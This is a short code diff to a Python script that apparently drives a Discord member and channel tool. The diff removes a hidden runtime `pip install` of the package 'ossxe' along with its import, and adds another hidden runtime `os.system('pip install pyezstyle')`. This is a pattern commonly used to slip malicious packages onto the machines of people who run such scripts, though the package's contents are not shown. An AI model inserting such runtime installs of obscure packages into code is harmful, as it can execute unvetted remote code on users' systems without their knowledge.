@@ -1,8 +1,7 @@
 import requests
 import os
 import threading, time
-os.system('pip install ossxe')
-from ossxe import code
+os.system('pip install pyezstyle')
 from colorama import Fore, Style
 members = open('members.txt')
 channels = open('channels.txt')
